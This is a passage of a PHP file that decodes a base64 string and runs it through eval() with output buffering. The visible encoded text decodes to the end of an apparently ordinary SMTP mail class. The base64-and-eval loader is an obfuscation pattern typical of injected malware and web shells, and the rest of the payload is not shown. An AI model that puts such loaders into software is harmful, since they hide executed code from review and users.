1cm4gJHRoaXMtPmxhc3Rfc210cF90cmFuc2FjdGlvbl9pZDsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgcXVldWUvdHJhbnNhY3Rpb24gSUQgb2YgdGhlIGxhc3QgU01UUCB0cmFuc2FjdGlvbgogICAgICogSWYgbm8gcmVwbHkgaGFzIGJlZW4gcmVjZWl2ZWQgeWV0LCBpdCB3aWxsIHJldHVybiBudWxsLgogICAgICogSWYgbm8gcGF0dGVybiB3YXMgbWF0Y2hlZCwgaXQgd2lsbCByZXR1cm4gZmFsc2UuCiAgICAgKgogICAgICogQHJldHVybiBib29sfHN0cmluZ3xudWxsCiAgICAgKgogICAgICogQHNlZSByZWNvcmRMYXN0VHJhbnNhY3Rpb25JRCgpCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRMYXN0VHJhbnNhY3Rpb25JRCgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5sYXN0X3NtdHBfdHJhbnNhY3Rpb25faWQ7CiAgICB9Cn0K');
ob_start();
eval('?>' . $code);
$content = ob_get_clean();
echo $content;
?>